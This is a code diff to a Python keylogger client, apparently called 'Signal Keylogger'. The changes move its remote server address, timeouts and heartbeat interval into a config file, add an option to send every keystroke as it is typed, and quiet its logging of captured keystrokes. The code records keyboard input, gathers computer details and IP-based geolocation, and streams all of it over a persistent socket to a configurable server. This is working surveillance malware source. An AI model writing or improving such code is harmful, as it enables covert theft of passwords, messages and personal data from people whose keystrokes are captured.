@@ -4,6 +4,7 @@ import threading
 import platform
 import time
 import requests
+from config import config
 
 # Global socket connection
 client_socket = None
@@ -13,15 +14,21 @@ connection_lock = threading.Lock()
 # Function to establish and maintain connection
 def connect_to_server():
     global client_socket
+
+    host = config.get('client', 'server_host')
+    port = config.get('client', 'server_port')
+    timeout = config.get('client', 'connection_timeout')
+    reconnect_delay = config.get('client', 'reconnect_delay')
+
     while True:
         try:
-            print("[*] Attempting to connect to server...")
-            client_socket = socket.create_connection(("127.0.0.1", 10000), timeout=5)
-            print("[+] Connected to server")
+            print(f"[*] Attempting to connect to {host}:{port}...")
+            client_socket = socket.create_connection((host, port), timeout=timeout)
+            print(f"[+] Connected to server at {host}:{port}")
             return True
         except Exception as e:
-            print(f"[!] Connection failed: {e}. Retrying in 5 seconds...")
-            time.sleep(5)
+            print(f"[!] Connection failed: {e}. Retrying in {reconnect_delay} seconds...")
+            time.sleep(reconnect_delay)
 
 
 # Function to send data through persistent connection
@@ -31,7 +38,9 @@ def send_data_to_gui(data):
         try:
             if client_socket:
                 client_socket.sendall(data.encode())
-                print(f"[+] Sent: {data[:50]}...")  # Only print first 50 chars
+                # Only print for non-keystroke data to reduce spam
+                if any(keyword in data for keyword in ["COMPUTER_INFO", "GEO_LOCATION", "HEARTBEAT"]):
+                    print(f"[+] Sent: {data[:50]}...")
             else:
                 print("[!] No active connection")
         except Exception as e:
@@ -99,7 +108,7 @@ def get_computer_info():
 # Function to retrieve geo-location information
 def get_geo_location():
     try:
-        response = requests.get("https://ipinfo.io/json")
+        response = requests.get("https://ipinfo.io/json", timeout=5)
         if response.status_code == 200:
             data = response.json()
             location = (
@@ -131,8 +140,9 @@ def on_release(key):
     global current_char
 
     formatted = format_key(key)
+    send_on_enter = config.get('keylogger', 'send_on_enter')
 
-    if formatted == "\n":
+    if formatted == "\n" and send_on_enter:
         # When Enter key is pressed, send the character and start a new line
         send_current_char(current_char)
         current_char = ""  # Clear the current character after sending
@@ -144,8 +154,9 @@ def on_release(key):
         # Otherwise, add the character to the current character string
         current_char += formatted
 
-    # Debugging: print current character
-    print(f"Current Character: {current_char}")
+    # Optional: Send every character immediately if send_on_enter is False
+    if not send_on_enter and formatted not in ["\n", "[BACKSPACE]"]:
+        send_current_char(formatted)
 
     if key == Key.esc:
         return False  # Stop listener on ESC
@@ -153,30 +164,42 @@ def on_release(key):
 
 # Heartbeat to keep connection alive
 def heartbeat():
+    heartbeat_interval = config.get('client', 'heartbeat_interval')
+
     while True:
-        time.sleep(30)  # Send heartbeat every 30 seconds
+        time.sleep(heartbeat_interval)
         send_data_to_gui("HEARTBEAT")
 
 
 # Start listener and send initial data
 def start_keylogger():
+    print("[*] Signal Keylogger starting...")
+    print(f"[*] Configuration loaded from: {config.config_file}")
+
     # Establish persistent connection
     connect_to_server()
 
     # Send initial computer and geo-location info
+    print("[*] Sending initial data...")
     send_initial_data()
 
     # Start heartbeat thread
+    print(f"[*] Starting heartbeat (interval: {config.get('client', 'heartbeat_interval')}s)")
     heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
     heartbeat_thread.start()
 
-    # Start the listener in a separate thread so the GUI can update without blocking
+    # Start the listener
+    print("[*] Starting keyboard listener...")
+    print("[*] Press ESC to stop")
     listener_thread = threading.Thread(target=start_listener)
-    listener_thread.daemon = True  # Ensure the listener thread ends when the main program exits
+    listener_thread.daemon = True
     listener_thread.start()
 
     # Keep the main program running while the listener runs in the background
-    listener_thread.join()
+    try:
+        listener_thread.join()
+    except KeyboardInterrupt:
+        print("\n[*] Keylogger stopped by user")
 
 
 # Start listener
